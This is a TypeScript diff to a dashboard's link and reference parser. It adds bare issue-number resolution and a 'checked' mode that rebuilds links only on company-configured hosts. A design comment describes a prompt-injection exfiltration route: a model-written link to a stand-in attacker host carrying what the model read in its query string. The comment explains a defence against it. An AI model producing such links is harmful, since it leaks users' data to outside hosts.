@@ -36,6 +36,23 @@
  *     a reference), or a dot and a letter (`gophrase/backend.py`). Its name
  *     holds no dot, which in prose is a file's extension or a stop; a
  *     repository named with one is written as a reference or an address.
+ *  3b. A BARE NUMBER (`#11`) is a reference only where its repository is
+ *     known, in this order, and otherwise words:
+ *     0. THE SAME SENTENCE BINDS IT: `#7 in owner/repo` (or `on`, `of`,
+ *        `from`) and `owner/repo #7` (or `PR #7`, `pull request #7`,
+ *        `issue #7`, `MR #7`, `merge request #7`, the last two a merge
+ *        request) are one reference, its words the whole phrase. The
+ *        repository needs no configured owner: the phrase says it is one.
+ *     1. THE MESSAGE NAMES THE NUMBER IN FULL: `gophrase/backend#11`
+ *        elsewhere in the message (an ask's question, context and options,
+ *        one comment, one page) makes `#11` that reference; the same number
+ *        under two repositories is words.
+ *     2. THE MESSAGE NAMES ONE REPOSITORY: every reference, repository and
+ *        code host address in it names the same one, and `#11` is in it.
+ *     3. Otherwise `#11` is words: a list's number, a rank, a heading.
+ *     A message is what [messageScope] reads. The number has no leading
+ *     zero and nothing of a word, a path, an entity (`&#11;`) or a decimal
+ *     (`#1.5`) on either side, and a code span is never read at all.
  *  4. A COMMIT is seven to forty lowercase hex characters holding a digit and
  *     a letter, and only where the prose says it is one: after the word
  *     `commit`, or after `at`, `at head` or `head` following a reference
@@ -129,6 +146,22 @@ const REFERENCE =
   /(?<![\p{L}\p{N}_./@-])((?:[A-Za-z0-9][\w.-]*\/)+[A-Za-z0-9][\w.-]*?)([#!@])([0-9a-f]{7,40}|\d+)(?![\p{L}\p{N}_-])/gu;
 const REPOSITORY =
   /(?<![\p{L}\p{N}_./@~:#!-])([A-Za-z0-9][A-Za-z0-9-]*)\/([A-Za-z0-9_-]*[A-Za-z0-9_])(?![\p{L}\p{N}_/@#!-]|\.[\p{L}\p{N}])/gu;
+/** What a bound number's repository is spelled as: owner, slash, name, no trailing stop. */
+const BOUND_PATH = String.raw`([A-Za-z0-9][A-Za-z0-9-]*\/[A-Za-z0-9_.-]*[A-Za-z0-9_])`;
+/** Where a bound repository ends: nothing that continues a path, a reference or a word. */
+const PATH_END = String.raw`(?![\p{L}\p{N}_/@#!-]|\.[\p{L}\p{N}])`;
+/** A bare number: no leading zero, nothing of a word, a path, an entity or a decimal around it. */
+const NUMBER = String.raw`#([1-9]\d{0,8})(?![\p{L}\p{N}_-]|\.\d)`;
+const NUMBER_BEFORE = String.raw`(?<![\p{L}\p{N}_&#./-])`;
+const BOUND_AFTER = new RegExp(
+  `${NUMBER_BEFORE}#([1-9]\\d{0,8})\\s+(?:in|on|of|from)\\s+${BOUND_PATH}${PATH_END}`,
+  "giu",
+);
+const BOUND_BEFORE = new RegExp(
+  `(?<![\\p{L}\\p{N}_./@~:#!-])${BOUND_PATH}\\s+(?:(PR|pull request|issue|MR|merge request)\\s+)?${NUMBER}`,
+  "giu",
+);
+const BARE_NUMBER = new RegExp(`${NUMBER_BEFORE}${NUMBER}`, "gu");
 const COMMIT_AFTER = /\b(commit|at head|at|head)\s+([0-9a-f]{7,40})(?![\p{L}\p{N}_-])/gu;
 const KEY = /(?<![\p{L}\p{N}_-])(\p{Lu}[\p{Lu}\p{N}]*)-\p{N}+(?![\p{L}\p{N}_-])/gu;
 const MENTION = /(?<![\p{L}\p{N}_.@/-])@([a-z0-9][a-z0-9-]*)(?![\p{L}\p{N}_-])/gu;
@@ -164,10 +197,27 @@ function trimAddress(raw: string): string {
 export const NO_OWNERS: ReadonlySet<string> = new Set();
 
 /**
- * Every token in one run of prose, in order, none overlapping (rule 7), with
- * `owners` the code hosts' owners in lower case ([codeHostOwners]).
+ * What a message names (rule 3b): the repositories its references name under
+ * each number, and every repository it names at all, each as `owner/repo`.
  */
-export function inlineTokens(text: string, owners: ReadonlySet<string> = NO_OWNERS): InlineToken[] {
+export interface MessageScope {
+  numbers: ReadonlyMap<string, ReadonlySet<string>>;
+  repositories: ReadonlySet<string>;
+}
+
+/** A message that names nothing: every bare number in it is words. */
+export const NO_SCOPE: MessageScope = { numbers: new Map(), repositories: new Set() };
+
+/**
+ * Every token in one run of prose, in order, none overlapping (rule 7), with
+ * `owners` the code hosts' owners in lower case ([codeHostOwners]) and
+ * `scope` what the message the run belongs to names ([messageScope]).
+ */
+export function inlineTokens(
+  text: string,
+  owners: ReadonlySet<string> = NO_OWNERS,
+  scope: MessageScope = NO_SCOPE,
+): InlineToken[] {
   const found: InlineToken[] = [];
   for (const m of text.matchAll(ADDRESS)) {
     const raw = trimAddress(m[0]);
@@ -213,6 +263,49 @@ export function inlineTokens(text: string, owners: ReadonlySet<string> = NO_OWNE
     });
   }
   const paths = writtenOutSpans(text);
+  // RULE 3b.0: a number the sentence binds to a repository, as one reference.
+  for (const m of text.matchAll(BOUND_AFTER)) {
+    const [whole, id, path] = m as unknown as [string, string, string];
+    found.push({
+      kind: "reference",
+      at: m.index,
+      end: m.index + whole.length,
+      text: whole,
+      path,
+      sep: "#",
+      id,
+    });
+  }
+  for (const m of text.matchAll(BOUND_BEFORE)) {
+    const [whole, path, cue, id] = m as unknown as [string, string, string | undefined, string];
+    const merge = cue !== undefined && /^(mr|merge request)$/iu.test(cue);
+    found.push({
+      kind: "reference",
+      at: m.index,
+      end: m.index + whole.length,
+      text: whole,
+      path,
+      sep: merge ? "!" : "#",
+      id,
+    });
+  }
+  // RULES 3b.1 and 3b.2: a bare number the message places in one repository.
+  for (const m of text.matchAll(BARE_NUMBER)) {
+    const end = m.index + m[0].length;
+    if (overlapsAny(paths, m.index, end)) continue;
+    const id = m[1]!;
+    const named = scope.numbers.get(id);
+    const path =
+      named !== undefined
+        ? named.size === 1
+          ? [...named][0]
+          : undefined
+        : scope.repositories.size === 1
+          ? [...scope.repositories][0]
+          : undefined;
+    if (path === undefined) continue;
+    found.push({ kind: "reference", at: m.index, end, text: m[0], path, sep: "#", id });
+  }
   for (const m of text.matchAll(KEY)) {
     const end = m.index + m[0].length;
     if (overlapsAny(paths, m.index, end)) continue;
@@ -263,10 +356,65 @@ function settle(found: InlineToken[]): InlineToken[] {
   return out;
 }
 
+// --- where a link may go --------------------------------------------------
+
+/**
+ * Where a run's links may go.
+ *
+ *  - `anchor`: a link is a link, to wherever its safe address goes.
+ *  - `checked`: a link is live ONLY WHERE THE DASHBOARD BUILT IT, from parts
+ *    it checked, to a place that is the company's: a key to its work item, a
+ *    handle to its seat, a reference, a commit or a repository to the code
+ *    host the company configured, and an address on a host the company
+ *    configured (a code host, Jira, Confluence, Mattermost) REBUILT from
+ *    what it is ([LinkDescription.canonical]), with nothing else the written
+ *    address carried. Every other address, an app route a writer spelled
+ *    among them, is drawn inert: its words, then the host it names, readable
+ *    and copyable and never a control.
+ *  - `text`: no link at all, inside a control or a link's own label, where a
+ *    link is invalid or steals the press.
+ *
+ * WHY `checked`. Words an agent or a model wrote may carry what it read from
+ * anywhere, a prompt injection among it, and an address is the one thing in
+ * them a reader acts on with a click: `https://evil.example.net/?q=<what the
+ * model read>` hands the words to whoever owns the host. A link the
+ * dashboard builds can only reach the company's own places, so a click there
+ * carries nothing a writer chose but a validated name or number. The
+ * Dashboard Assistant's answers and the Inbox read `checked` (ADR-0061).
+ */
+export type LinkMode = "anchor" | "checked" | "text";
+
+/**
+ * Where a link points, as a reader checks it: the host and the path of a web
+ * address with no scheme (`docs.example.com/pricing`), the address of a
+ * `mailto:`, and nothing for anything else (an app route, a scheme this
+ * product does not follow), which is drawn as its label alone.
+ */
+export function linkTarget(raw: string): string | null {
+  const href = safeHref(raw);
+  if (!href || href.startsWith("#")) return null;
+  if (href.startsWith("mailto:")) return href.slice("mailto:".length);
+  try {
+    const url = new URL(href);
+    const path = url.pathname === "/" ? "" : url.pathname;
+    return `${url.host}${path}`;
+  } catch {
+    return null;
+  }
+}
+
 // --- what an address is ----------------------------------------------------
 
 /** The vendors an address can be drawn with the mark of (`@crewlethq/icons`' `Vendor`). */
 export type LinkVendor = "github" | "gitlab" | "slack" | "mattermost" | "atlassian";
+
+/** A code host's repository an address names, and the issue or pull request number in it. */
+export interface CodePlace {
+  /** `owner/repo` (a GitLab project's whole path), lower case. */
+  path: string;
+  /** An issue's or a pull request's number, or null for a repository, a merge request or a commit. */
+  number: string | null;
+}
 
 /** What an address is, as a reader is shown it. */
 export interface LinkDescription {
@@ -282,6 +430,15 @@ export interface LinkDescription {
    * are its host.
    */
   kind: string | null;
+  /**
+   * The address rebuilt from what it is (`<host>/<owner>/<repo>/pull/14`),
+   * on a host the company configured, with no query, fragment or anything
+   * else the written address carried; null for every other address. See
+   * [LinkMode] `checked`: this is the only address a written link opens there.
+   */
+  canonical: string | null;
+  /** The code host repository it names, which a message's scope reads ([messageScope]). */
+  place: CodePlace | null;
 }
 
 /** The longest label an address is shown with before it is cut. */
@@ -341,18 +498,43 @@ const CODE_NAME = /^[A-Za-z0-9][\w.-]*$/u;
 /** A commit's SHA in an address, as its label shortens it. */
 const SHA = /^[0-9a-f]{7,40}$/iu;
 
-/** The hosts an app lives at: its public one, and the company's own. */
-function basesOf(hosts: readonly LinkHost[], kind: LinkHostKind, publicBase?: string): string[] {
-  const own = hosts.filter((h) => h.kind === kind).map((h) => h.url);
-  return publicBase ? [publicBase, ...own] : own;
+/** A path segment an address is rebuilt from: letters, digits, `.`, `_`, `~` and `-`. */
+const SEGMENT = /^[A-Za-z0-9~_.-]+$/u;
+
+/** Where an address is under an app's hosts: its segments, and the company's base it is under. */
+interface Under {
+  parts: string[];
+  /** The configured base it is under, or null under the app's public host alone. */
+  own: string | null;
 }
 
-function firstUnder(url: URL, bases: readonly string[]): string[] | null {
-  for (const base of bases) {
-    const parts = under(url, base);
-    if (parts !== null) return parts;
+/**
+ * Where `url` is under one of an app's hosts: a host the company configured
+ * for it first (`link_hosts`, with its path prefix), then its public one.
+ */
+function underApp(
+  url: URL,
+  hosts: readonly LinkHost[],
+  kind: LinkHostKind,
+  publicBase?: string,
+): Under | null {
+  for (const host of hosts) {
+    if (host.kind !== kind) continue;
+    const parts = under(url, host.url);
+    if (parts !== null) return { parts, own: host.url };
   }
-  return null;
+  const parts = publicBase === undefined ? null : under(url, publicBase);
+  return parts === null ? null : { parts, own: null };
+}
+
+/**
+ * An address on the company's own `base`, rebuilt from `parts`, each checked
+ * against [SEGMENT] and encoded, or null where there is no base or a part is
+ * not one an address is rebuilt from.
+ */
+function rebuilt(base: string | null, parts: readonly string[]): string | null {
+  if (base === null || !parts.every((p) => SEGMENT.test(p))) return null;
+  return safeHref(`${base}/${parts.map((p) => encodeURIComponent(p)).join("/")}`);
 }
 
 /** A host at a domain or under it, on a dot: `acme.slack.com` is Slack's, `slack.com.evil.test` is not. */
@@ -361,111 +543,94 @@ function atDomain(host: string, domain: string): boolean {
   return h === domain || h.endsWith(`.${domain}`);
 }
 
-function describeGitHub(parts: string[], url: URL): LinkDescription {
-  const [owner, repo, what, id] = parts;
-  if (!owner || !repo || !CODE_NAME.test(owner) || !CODE_NAME.test(repo)) {
-    return { vendor: "github", label: shortAddress(url), code: false, kind: "GitHub" };
-  }
-  if ((what === "pull" || what === "issues") && id && /^\d+$/.test(id)) {
-    const label = `${owner}/${repo}#${id}`;
-    return {
-      vendor: "github",
-      label,
-      code: true,
-      kind: "GitHub",
-    };
-  }
-  if (what === "commit" && id && SHA.test(id)) {
-    const label = `${owner}/${repo}@${id.slice(0, 7)}`;
-    return { vendor: "github", label, code: true, kind: "GitHub" };
-  }
-  if (what === undefined) {
-    return {
-      vendor: "github",
-      label: `${owner}/${repo}`,
-      code: true,
-      kind: "GitHub",
-    };
-  }
-  return {
-    vendor: "github",
-    label: shortAddress(url),
-    code: false,
-    kind: "GitHub",
-  };
+/** An address of an app whose words it is no reference of: its host and path, after its mark. */
+function hostAndPath(vendor: LinkVendor, kind: string, url: URL): LinkDescription {
+  return { vendor, label: shortAddress(url), code: false, kind, canonical: null, place: null };
 }
 
-function describeGitLab(parts: string[], url: URL): LinkDescription {
+function describeGitHub({ parts, own }: Under, url: URL): LinkDescription {
+  const [owner, repo, what, id] = parts;
+  if (!owner || !repo || !CODE_NAME.test(owner) || !CODE_NAME.test(repo)) {
+    return hostAndPath("github", "GitHub", url);
+  }
+  const path = `${owner}/${repo}`.toLowerCase();
+  const said = (label: string, tail: string[], number: string | null = null) => ({
+    vendor: "github" as const,
+    label,
+    code: true,
+    kind: "GitHub",
+    canonical: rebuilt(own, [owner, repo, ...tail]),
+    place: { path, number },
+  });
+  if ((what === "pull" || what === "issues") && id && /^\d+$/.test(id)) {
+    return said(`${owner}/${repo}#${id}`, [what, id], id);
+  }
+  if (what === "commit" && id && SHA.test(id)) {
+    return said(`${owner}/${repo}@${id.slice(0, 7)}`, [what, id]);
+  }
+  if (what === undefined) return said(`${owner}/${repo}`, []);
+  return hostAndPath("github", "GitHub", url);
+}
+
+function describeGitLab({ parts, own }: Under, url: URL): LinkDescription {
   const dash = parts.indexOf("-");
   const names = dash < 0 ? parts : parts.slice(0, dash);
   if (names.length < 2 || !names.every((name) => CODE_NAME.test(name))) {
-    return { vendor: "gitlab", label: shortAddress(url), code: false, kind: "GitLab" };
+    return hostAndPath("gitlab", "GitLab", url);
   }
   const project = names.join("/");
+  const path = project.toLowerCase();
   const [what, id] = dash < 0 ? [] : parts.slice(dash + 1);
+  const said = (label: string, tail: string[], number: string | null = null) => ({
+    vendor: "gitlab" as const,
+    label,
+    code: true,
+    kind: "GitLab",
+    canonical: rebuilt(own, [...names, ...tail]),
+    place: { path, number },
+  });
   if (what === "merge_requests" && id && /^\d+$/.test(id)) {
-    const label = `${project}!${id}`;
-    return { vendor: "gitlab", label, code: true, kind: "GitLab" };
+    return said(`${project}!${id}`, ["-", what, id]);
   }
   if (what === "issues" && id && /^\d+$/.test(id)) {
-    const label = `${project}#${id}`;
-    return { vendor: "gitlab", label, code: true, kind: "GitLab" };
+    return said(`${project}#${id}`, ["-", what, id], id);
   }
   if (what === "commit" && id && SHA.test(id)) {
-    const label = `${project}@${id.slice(0, 7)}`;
-    return { vendor: "gitlab", label, code: true, kind: "GitLab" };
+    return said(`${project}@${id.slice(0, 7)}`, ["-", what, id]);
   }
-  if (dash < 0) {
-    return { vendor: "gitlab", label: project, code: true, kind: "GitLab" };
-  }
-  return {
-    vendor: "gitlab",
-    label: shortAddress(url),
-    code: false,
-    kind: "GitLab",
-  };
+  if (dash < 0) return said(project, []);
+  return hostAndPath("gitlab", "GitLab", url);
 }
 
+/**
+ * A Slack address: what it is in the workspace it names. NEVER REBUILT: a
+ * workspace is a subdomain anybody can register, so no Slack address is the
+ * company's own by its host.
+ */
 function describeSlack(url: URL): LinkDescription {
   const team = url.hostname.split(".")[0] ?? "";
   const parts = segments(url.pathname);
   if (parts[0] === "archives" && parts[1] && team !== "app") {
     const what = parts[2]?.startsWith("p") ? "Message" : "Channel";
     const label = `${what} in ${team}`;
-    return { vendor: "slack", label, code: false, kind: "Slack" };
+    return { vendor: "slack", label, code: false, kind: "Slack", canonical: null, place: null };
   }
-  return {
-    vendor: "slack",
-    label: shortAddress(url),
-    code: false,
-    kind: "Slack",
-  };
+  return hostAndPath("slack", "Slack", url);
 }
 
-function describeMattermost(parts: string[], url: URL): LinkDescription {
+function describeMattermost({ parts, own }: Under, url: URL): LinkDescription {
   const [team, what, name] = parts;
-  if (team && what === "channels" && name) {
+  if (team && (what === "channels" || what === "pl") && name) {
     return {
       vendor: "mattermost",
-      label: `~${name}`,
+      label: what === "channels" ? `~${name}` : `Post in ${team}`,
       code: false,
       kind: "Mattermost",
+      canonical: rebuilt(own, [team, what, name]),
+      place: null,
     };
   }
-  if (team && what === "pl" && name) {
-    return {
-      vendor: "mattermost",
-      label: `Post in ${team}`,
-      code: false,
-      kind: "Mattermost",
-    };
-  }
-  return {
-    vendor: "mattermost",
-    label: shortAddress(url),
-    code: false,
-    kind: "Mattermost",
-  };
+  return hostAndPath("mattermost", "Mattermost", url);
 }
 
 /**
@@ -481,51 +646,52 @@ function onTenant(label: string, tenant: string | null): string {
   return tenant === null ? label : `${label} (${tenant})`;
 }
 
-function describeJira(parts: string[], tenant: string | null): LinkDescription | null {
+function describeJira({ parts, own }: Under, url: URL): LinkDescription | null {
   const at = parts.indexOf("browse");
   const key = at < 0 ? undefined : parts[at + 1];
-  if (key && /^[A-Z][A-Z0-9]*-\d+$/.test(key)) {
-    return {
-      vendor: "atlassian",
-      label: onTenant(key, tenant),
-      code: tenant === null,
-      kind: "Jira",
-    };
-  }
-  return null;
+  if (!key || !/^[A-Z][A-Z0-9]*-\d+$/.test(key)) return null;
+  return {
+    vendor: "atlassian",
+    label: onTenant(key, own === null ? url.host : null),
+    code: own !== null,
+    kind: "Jira",
+    canonical: rebuilt(own, ["browse", key]),
+    place: null,
+  };
 }
 
-function describeConfluence(
-  parts: string[],
-  url: URL,
-  tenant: string | null,
-): LinkDescription | null {
+function describeConfluence({ parts, own }: Under, url: URL): LinkDescription | null {
   const at = parts.indexOf("pages");
   const slug = at < 0 ? undefined : parts[at + 2];
   if (slug) {
     const title = slug.replace(/\+/g, " ");
-    return { vendor: "atlassian", label: onTenant(title, tenant), code: false, kind: "Confluence" };
-  }
-  if (parts.includes("wiki") || parts.includes("spaces") || parts.includes("display")) {
+    const id = parts[at + 1] ?? "";
     return {
       vendor: "atlassian",
-      label: shortAddress(url),
+      label: onTenant(title, own === null ? url.host : null),
       code: false,
       kind: "Confluence",
+      // A PAGE BY ITS ID: the title in its address is the writer's words.
+      canonical: /^\d+$/.test(id) ? rebuilt(own, parts.slice(0, at + 2)) : null,
+      place: null,
     };
+  }
+  if (parts.includes("wiki") || parts.includes("spaces") || parts.includes("display")) {
+    return hostAndPath("atlassian", "Confluence", url);
   }
   return null;
 }
 
 /**
  * What an address is: whose mark it carries, what it says and what it is
- * called, read from the PARSED address alone (rule 2).
+ * called, read from the PARSED address alone (rule 2), and the address it is
+ * rebuilt as on the company's own host ([LinkDescription.canonical]).
  *
  * THE HOST DECIDES, never a label: a link reading "github.com/x" that goes
- * elsewhere is drawn as where it goes. A host is an app's when it is the
- * app's public host exactly (github.com, gitlab.com), a host under the app's
- * own domain on a dot boundary (`*.slack.com`, `*.atlassian.net`), or one the
- * company configured for it (`link_hosts`, with its path prefix). Null for an
+ * elsewhere is drawn as where it goes. A host is an app's when it is one the
+ * company configured for it (`link_hosts`, with its path prefix), the app's
+ * public host exactly (github.com, gitlab.com), or a host under the app's own
+ * domain on a dot boundary (`*.slack.com`, `*.atlassian.net`). Null for an
  * address that is not a safe web address at all.
  */
 export function describeLink(raw: string, hosts: readonly LinkHost[]): LinkDescription | null {
@@ -539,32 +705,29 @@ export function describeLink(raw: string, hosts: readonly LinkHost[]): LinkDescr
   }
   if (url.protocol !== "https:" && url.protocol !== "http:") return null;
 
-  const gh = firstUnder(url, basesOf(hosts, "github", "https://github.com"));
+  const gh = underApp(url, hosts, "github", "https://github.com");
   if (gh !== null) return describeGitHub(gh, url);
-  const gl = firstUnder(url, basesOf(hosts, "gitlab", "https://gitlab.com"));
+  const gl = underApp(url, hosts, "gitlab", "https://gitlab.com");
   if (gl !== null) return describeGitLab(gl, url);
   if (atDomain(url.hostname, "slack.com")) return describeSlack(url);
-  const mm = firstUnder(url, basesOf(hosts, "mattermost"));
+  const mm = underApp(url, hosts, "mattermost");
   if (mm !== null) return describeMattermost(mm, url);
 
   const cloud = atDomain(url.hostname, "atlassian.net");
-  const ownJira = firstUnder(url, basesOf(hosts, "jira"));
-  const ownWiki = firstUnder(url, basesOf(hosts, "confluence"));
-  const jira = ownJira ?? (cloud ? segments(url.pathname) : null);
-  const wiki = ownWiki ?? (cloud ? segments(url.pathname) : null);
-  const atlassian =
-    (jira && describeJira(jira, ownJira === null ? url.host : null)) ??
-    (wiki && describeConfluence(wiki, url, ownWiki === null ? url.host : null));
+  const tenant = (): Under | null => (cloud ? { parts: segments(url.pathname), own: null } : null);
+  const jira = underApp(url, hosts, "jira") ?? tenant();
+  const wiki = underApp(url, hosts, "confluence") ?? tenant();
+  const atlassian = (jira && describeJira(jira, url)) ?? (wiki && describeConfluence(wiki, url));
   if (atlassian) return atlassian;
-  if (cloud || jira !== null || wiki !== null) {
-    return {
-      vendor: "atlassian",
-      label: shortAddress(url),
-      code: false,
-      kind: "Atlassian",
-    };
-  }
-  return { vendor: null, label: shortAddress(url), code: false, kind: null };
+  if (jira !== null || wiki !== null) return hostAndPath("atlassian", "Atlassian", url);
+  return {
+    vendor: null,
+    label: shortAddress(url),
+    code: false,
+    kind: null,
+    canonical: null,
+    place: null,
+  };
 }
 
 /** Where a bare reference lives, and the address it opens, decided from the hosts alone. */
@@ -654,4 +817,40 @@ export function codeHostOwners(hosts: readonly LinkHost[]): ReadonlySet<string> 
     h.kind === "github" || h.kind === "gitlab" ? (h.owners ?? []) : [],
   );
   return owners.length === 0 ? NO_OWNERS : new Set(owners.map((o) => o.toLowerCase()));
+}
+
+/**
+ * What a message names (rule 3b): every reference, repository and code host
+ * address its texts spell, with the issue and pull request numbers under
+ * each repository. A message is the texts one person reads as one thing: an
+ * ask's question, context, recommendation and options, one comment, one
+ * page.
+ *
+ * READ FROM THE WORDS ALONE, at the boundaries every other token is: a
+ * number under two repositories, or a message naming two, places no bare
+ * number anywhere, rather than guessing which one a writer meant.
+ */
+export function messageScope(texts: readonly string[], hosts: readonly LinkHost[]): MessageScope {
+  const owners = codeHostOwners(hosts);
+  const numbers = new Map<string, Set<string>>();
+  const repositories = new Set<string>();
+  const name = (path: string, number: string | null) => {
+    const repo = path.toLowerCase();
+    repositories.add(repo);
+    if (number === null) return;
+    const under = numbers.get(number) ?? new Set<string>();
+    under.add(repo);
+    numbers.set(number, under);
+  };
+  for (const text of texts) {
+    for (const token of inlineTokens(text, owners)) {
+      if (token.kind === "reference") name(token.path, token.sep === "#" ? token.id : null);
+      else if (token.kind === "repository") name(`${token.owner}/${token.repo}`, null);
+      else if (token.kind === "address") {
+        const place = describeLink(token.href, hosts)?.place;
+        if (place) name(place.path, place.number);
+      }
+    }
+  }
+  return numbers.size === 0 && repositories.size === 0 ? NO_SCOPE : { numbers, repositories };
 }
